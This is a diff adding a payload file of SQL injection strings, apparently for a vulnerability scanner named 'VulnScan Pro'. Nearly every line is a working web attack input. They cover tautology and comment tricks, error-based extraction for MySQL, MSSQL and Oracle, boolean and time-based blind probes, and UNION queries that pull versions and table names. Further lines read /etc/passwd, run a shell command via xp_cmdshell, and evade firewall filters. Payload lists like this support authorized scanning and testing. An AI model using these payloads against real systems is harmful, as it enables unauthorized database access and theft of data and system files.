@@ -1,0 +1,78 @@
+# SQL Injection payloads for VulnScan Pro
+# String context payloads
+'
+''
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'-- -
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1-- -
+' OR 1=1#
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+') OR ('1'='1
+')) OR (('1'='1
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+' AND 1=1#
+# Numeric context
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1 AND 1=1
+1 AND 1=2
+1 AND 1=1--
+# Error-based (MySQL)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--
+' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+# Error-based (MSSQL)
+1 AND 1=CONVERT(int, @@version)--
+' AND 1=CONVERT(int, @@version)--
+' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
+# Error-based (Oracle)
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+# Boolean blind
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--
+' AND LENGTH(database())>0--
+' AND ASCII(SUBSTRING(database(),1,1))>64--
+# Time-based blind (MySQL)
+' AND SLEEP(5)--
+'; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+1; SELECT SLEEP(5)--
+1 AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+# Time-based blind (MSSQL)
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+# Time-based blind (PostgreSQL)
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version,NULL--
+' UNION SELECT NULL,@@version--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION ALL SELECT NULL--
+# Out-of-band
+' AND LOAD_FILE('/etc/passwd')--
+'; EXEC xp_cmdshell('nslookup example.com')--
+# WAF bypass
+'/**/OR/**/1=1--
+' /*!OR*/ 1=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+' oR '1'='1
+' Or 1=1--
+0x27 OR 1=1--
